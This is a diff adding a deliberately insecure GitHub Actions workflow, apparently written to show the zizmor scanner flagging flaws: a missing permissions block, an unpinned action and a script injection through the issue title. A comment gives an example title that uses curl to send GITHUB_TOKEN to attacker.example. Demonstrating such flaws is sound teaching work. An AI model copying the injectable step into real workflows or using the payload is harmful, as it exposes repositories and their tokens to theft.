@@ -1,0 +1,39 @@
+name: Issue Processor (Demo – Intentionally Flawed)
+
+# This workflow is introduced by the demo PR to show how zizmor catches
+# security issues in newly proposed workflow files before they are merged.
+
+on:
+  issues:
+    types: [opened, edited]
+
+# FLAW: No permissions block. The GITHUB_TOKEN inherits the repository's
+# default permissions, which typically include write access to issues,
+# pull requests, and repository contents.
+
+jobs:
+  process-issue:
+    runs-on: ubuntu-latest
+
+    steps:
+      # FLAW: Unpinned action. actions/cache is referenced by the mutable tag
+      # @v3 rather than a full commit SHA. A compromised or redirected tag
+      # could inject malicious code into every workflow run.
+      - name: Cache dependencies
+        uses: actions/cache@v3
+        with:
+          path: ~/.m2
+          key: ${{ runner.os }}-maven
+
+      # FLAW: Script injection. github.event.issue.title is attacker-controlled
+      # input — a user who opens an issue controls its title. The expression is
+      # expanded by GitHub Actions before the shell sees it, so a title such as
+      #
+      #   "; curl https://attacker.example/exfil?tok=$GITHUB_TOKEN #"
+      #
+      # would be executed verbatim by the runner. The safe fix is to pass the
+      # value through an environment variable (see secure.yml CONTROL 5).
+      - name: Log issue details
+        run: |
+          echo "Processing issue: ${{ github.event.issue.title }}"
+          echo "Opened by: ${{ github.event.issue.user.login }}"
